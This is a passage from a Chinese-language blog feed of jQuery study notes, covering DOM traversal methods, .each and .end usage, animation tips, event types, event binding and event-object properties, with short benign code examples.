<li><p><code>.map(callback(index, domElement))</code> 方法特别适用于获取或设置元素集合中的值</p>
</li>
<li><code>.slice(start [, end ])</code> 根据指定的下标范围，过滤匹配的元素集合，并生成一个新的 jQuery 对象</li>
<li><code>add()</code> 添加新 jQuery 对象到堆栈，而 <code>addback()</code> 添加堆栈中元素集合到当前集合</li>
<li><code>.contents()</code> 和 <code>.children()</code> 检索直接子元素，<code>.find()</code> 检索后代元素，其中 <code>.contents()</code> 包括文本节点和注释节点，以及 jQuery 对象中产生的 HTML 元素</li>
<li><code>.parent()</code> 匹配直接父元素， <code>.parents()</code> 匹配祖先元素（不包括自己，可能返回元素数组）， <code>.parentsUntil()</code> 查找并返回遇到跟参数匹配的元素（不包括）前的所有祖先元素， <code>.closest()</code> 匹配祖先元素（包括自己，只返回最近一个）<blockquote>
<p><code>.next()</code>、<code>.nextAll()</code> 与 <code>.nextUntil()</code> 和 <code>.prev()</code>、<code>.prevAll()</code> 与 <code>.prevUntil()</code> 两组用法类似</p>
<p><code>$(&quot;html&quot;).parent()</code> 方法返回一个包含 <strong>document</strong> 的集合，而 <code>$(&quot;html&quot;).parents()</code> 返回一个空集合</p>
</blockquote>
</li>
</ul>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
<li><p><code>.each(function(index, Element))</code> 方法用来让 DOM 循环结构更简单更不易出错。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'li'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">index</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(index + <span class="string">': '</span> + $(<span class="keyword">this</span>).text()); <span class="comment">// this 总是指向对应的 DOM 元素，使用 $(this) 获得的是 jQuery 对象</span></div><div class="line">  <span class="keyword">if</span> (index === <span class="number">3</span>) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 使用return提前结束each()</span></div><div class="line">  &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p><code>end()</code> 可用于链式写法 <em>终止在当前链的最新过滤操作，并返回匹配的元素的以前状态</em></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'ul.first'</span>).find(<span class="string">'.foo'</span>)</div><div class="line">  .css(<span class="string">'background-color'</span>, <span class="string">'red'</span>)</div><div class="line">.end().find(<span class="string">'.bar'</span>) <span class="comment">// 返回到 $('ul.first') 的栈</span></div><div class="line">  .css(<span class="string">'background-color'</span>, <span class="string">'green'</span>)</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><h4 id="基础动画"><a href="#基础动画" class="headerlink" title="基础动画"></a>基础动画</h4><ul>
<li>所有jQuery效果都能通过设置 <code>jQuery.fx.off = true</code> 全局地关闭，效果等同于持续时间设置为 <code>0</code></li>
<li>元素的 <code>display</code> 原本属性值保存在 jQuery 的数据缓存，这样使用切换显示的方法时，将恢复其原本 <code>display</code> 值</li>
<li>可以传入一个回调在对应动画完成后运行，比如在 <em>弹窗中，淡出后删除其对应 DOM 结构</em></li>
<li><code>.fadeTo()</code> 方法调整匹配元素的透明度</li>
</ul>
<h4 id="自定义动画"><a href="#自定义动画" class="headerlink" title="自定义动画"></a>自定义动画</h4><ul>
<li>建议避免使用复杂的 jQuery 动画，使用 CSS3 动画以在高级浏览器中获得更好性能与表现</li>
</ul>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><blockquote>
<p>jQuery 的事件绑定子系统为每一个事件处理函数分配一个唯一的 <strong>ID</strong> 用于对其进行跟踪，这样的话，当需要解除绑定特定的事件处理时，系统就知道该解除绑定哪个事件处理函数</p>
</blockquote>
<h4 id="常见事件类型及用法"><a href="#常见事件类型及用法" class="headerlink" title="常见事件类型及用法"></a>常见事件类型及用法</h4><ul>
<li><p><code>$(document).ready(handler)</code> 与 <code>$(handler)</code> 等价，前者更语义化</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">jQuery(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params">$</span>) </span>&#123;</div><div class="line">  <span class="comment">// 当引入其他类库时，在此可正常使用 $</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p><code>.ready()</code> 方法通常和 <code>&lt;body onload=&quot;handler&quot;&gt;</code> 属性是不兼容的。如果 <code>load</code> 必须使用，要么不使用 <code>.ready()</code>，要么使用 jQuery 的 <code>.load()</code> 方法向 <code>window</code> 或一些指定的元素（例如，图片）绑定 <code>load</code> 事件</p>
</li>
<li>为代码统一及便于记忆，建议事件绑定均使用通用方法而不是速写方式，首选方法 <code>.on()</code>、<code>.off()</code> 和 <code>.trigger()</code>：<ul>
<li>浏览器事件：<code>.resize()</code> 与 <code>.scroll()</code></li>
<li>表单事件：<code>.blur()</code>，<code>.change()</code>，<code>.focus()</code>，<code>.select()</code>，<code>.submit()</code></li>
<li>键盘事件：<code>.keydown()</code>， <code>.keypress()</code>， <code>.keyup()</code></li>
<li>鼠标事件：<code>.click()</code>， <code>.contextmenu()</code>，<code>.dbclick()</code>，<code>.focusin()</code>， <code>.foucsout()</code>， <code>.hover()</code>，<code>.mouseenter()</code>，<code>.mouseleave()</code>，<code>.mousedown()</code>，<code>.mouseup()</code>，<code>.mousemove()</code>，<code>mouseout()</code></li>
</ul>
</li>
<li><code>resize</code> 事件处理中的代码，不应该依赖于事件被调用的次数。由于不同浏览器对该事件实现的方式不同，该事件被调用的时机也不同</li>
<li><p>一个元素的值改变的时候将触发 <code>change</code> 事件。此事件仅限用于 <code>&lt;input&gt;</code>，<code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code> 元素</p>
<blockquote>
<p>注意：使用 JavaScript 改变输入元素的值，例如使用 <code>.val()</code>，将不会触发该事件。</p>
</blockquote>
</li>
<li><p>在一个元素中进行文本选择时，<code>select</code> 事件就会被触发。此事件只用在 <code>&lt;input type=&quot;text&quot;&gt;</code> 和 <code>&lt;textarea&gt;</code></p>
</li>
<li><p>按下并按住这个键（不松开）的时，<code>keydown</code> 事件只触发一次，但是 <code>keypress</code> 会在每个字符插入的时候都会触发。组合键(如 <code>Shift</code> )会触发 <code>keydown</code> 事件，但不会触发 <code>keypress</code> 事件。</p>
<blockquote>
<p>值得注意的是 <code>keydown</code> 和 <code>keyup</code> 提供一个代码，表示哪一个键被按下，而 <code>keypress</code> 表示被输入哪个字符。</p>
<p>例如，按下了小写的 <code>a</code>，在 <code>keydown</code> 和 <code>keyup</code> 中，对应该键的代码是 <code>65</code>，但是对于 <code>keypress</code> 而言，接收到的代码是 <code>97</code>。如果是大写 <code>A</code> 的话，则所有的相关事件接收到的代码都是 <code>65</code> 。</p>
<p>由于这个区别，若想捕获敲击了哪个特殊键的话，例如方向键，使用 <code>.keydown()</code> 或 <code>.keyup()</code> 更好。如果要捕获实际输入文本，<code>.keypress()</code> 可能是一个更好的选择。</p>
</blockquote>
</li>
<li><p><code>focusin</code>（或 <code>focusout</code>）事件会在元素（或者其内部的任何元素）获得焦点时触发。这跟 <code>focus</code>（或<code>blur</code>）事件的显著区别在于，它可以在父元素上检测子元素获得焦点的情况（换而言之，它支持事件冒泡）</p>
</li>
<li><p><code>.hover()</code> 方法同时绑定 <code>mouseenter</code> 和 <code>mouseleave</code> 事件</p>
<blockquote>
<p><code>$(selector).hover(fnIn, fnOut)</code> 是  $<code>(selector).mouseenter(fnIn).mouseleave(fnOut)</code> 的简写</p>
</blockquote>
</li>
<li><p><code>mouseleave</code> 与 <code>mouseout</code>、<code>mouseenter</code> 与 <code>mouseover</code> 之间的不同之处是事件的冒泡的方式, 一般用前者</p>
<blockquote>
<p><code>mouseleave</code> 事件是 <code>IE</code> 专有的, 由于该事件在平时很有用, jQuery 模拟了这一事件，使它可用于所有浏览器</p>
</blockquote>
</li>
</ul>
<h4 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h4><ul>
<li>使用 <code>.on()</code> 方法带代替 <code>.delegate()</code> （多元素绑定）和 <code>.bind()</code>（单元素绑定）方法将事件处理程序绑定到 <code>document</code></li>
<li><code>one()</code> 方法绑定一次性事件, 等价于 <code>.on()</code> 触发事件后马上 <code>off()</code></li>
<li><code>.trigger()</code> 模拟事件的触发，具备合成的 event 对象。如不希望触发默认事件或冒泡，使用 <code>.triggerHandler()</code></li>
</ul>
<h4 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h4><ul>
<li><code>event.currentTarget</code> 总是等于该函数的 <code>this</code></li>
<li><code>event.data</code> 作为一个数据对象传递给一个事件</li>
<li><code>event.preventDefault()</code> 阻止默认事件行为</li>
<li><code>event.isDefaultPrevented()</code>、<code>event.isImmediatePropagationStopped()</code> 和 <code>event.isPropagationStopped()</code>均为判断对应方法是否调用过，返回布尔值</li>
<li><code>event.pageX</code> 和 <code>event.pageY</code> 为鼠标相对于 <code>document</code> 的左边缘的位置（左/右）</li>
<li><code>event.stopImmediatePropagation()</code> 阻止 <em>剩余</em> 的事件处理函数执行并且防止事件冒泡到 DOM 树; 而<code>event.stopPropagation()</code> 不会阻止同一元素上的其它事件，同样防止事件冒泡到 DOM 树上（不触发任何前辈元素上的事件）</li>
<li><p><code>event.target</code> 是注册事件时的元素（或子元素）, 通过比较它与 <code>this</code> 来确定事件是否由冒泡触发。观察<code>event.relatedTarget</code> 找到事件涉及的其他 DOM 元素</p>
<blockquote>
<p><code>event.relatedTarget</code> 对于 <code>mouseout</code> 事件，指向被进入的元素； 对于 <code>mouseover</code> 事件，指向被离开的元素</p>
</blockquote>
</li>
<li><p>事件处理函数的最后返回值会被记录在 <code>event.result</code> 中</p>
</li>
<li><p><code>event.timeStamp</code> 记录事件的时间戳</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> last</div><div class="line">$(<span class="string">'div'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (last) &#123;</div><div class="line">        <span class="built_in">console</span>.log(event.timeStamp - last); <span class="comment">//打印两次点击时间差</span></div><div class="line">    &#125;</div><div class="line">    last = event.timeStamp;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p><code>event.which</code> 将 <code>event.keyCode</code> 和 <code>event.charCode</code> 标准化了。用来监视鼠标和键盘输入</p>
</li>
</ul>
<h4 id="特殊-2"><a href="#特殊-2" class="headerlink" title="特殊"></a>特殊</h4><ul>
<li><code>$.holdReady()</code> 方法允许调用者延迟 jQuery 的 <code>ready</code> 事件（在事件触发前）<blockquote>
<p>为了延迟 <code>ready</code> 事件，首先要调用 <code>$.holdReady(true)</code>，当 <code>ready</code> 事件准备执行时，再调用 <code>$.holdReady(false)</code></p>
</blockquote>
</li>
<li>命名空间 <code>event.namespace</code> 的用法<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'p'</span>).bind(<span class="string">'test.something'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123; <span class="comment">// 绑定一个自定义事件</span></div><div class="line">    alert(event.namespace); <span class="comment">// event指向test</span></div><div class="line">&#125;);</div><div class="line">$(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123; <span class="comment">// 通过浏览器事件来间接触发自定义命名事件</span></div><div class="line">    $(<span class="string">'p'</span>).trigger(<span class="string">'test.something'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;作为一个专业的前端开发，你真的会用 jQuery 吗？jQuery 的精妙，随着我对 JavaScript 的理解的加深而愈加感到惊讶  &lt;/p&gt;
&lt;p&gt;其实，如果我们不需要进行对 DOM 的操作兼容（主要针对 IE），那么大抵可以完全抛弃 jQuery，毕竟 ES5 和 DOM-Lv2 已经提供了很多 jQuery 常用的功能了，既然使用 jQuery 是为了开发效率和兼容性考量，那么我是很推荐尽量使用 jQuery 提供的大部分功能，毕竟这样对代码阅读者和书写者都是很舒服的事情，使用 &lt;code&gt;$.each()&lt;/code&gt; 代替了常规的 &lt;code&gt;for&lt;/code&gt; 循环，使用 &lt;code&gt;$.isEmptyObject(object)&lt;/code&gt; 来判断空对象，等等&lt;/p&gt;
&lt;p&gt;很多人觉得使用 jQuery 不够高端，甚至觉得它会带来性能问题，但其实我认为，对于快速迭代的考虑，代码的可读性和兼容性优先级要远高于那点可怜的性能加成（事实上，自己造的轮子真不一定比 jQuery 性能好，简单的例子，jQuery 通常会考虑缓存 DOM，同时不会忘记卸载过期事件）&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
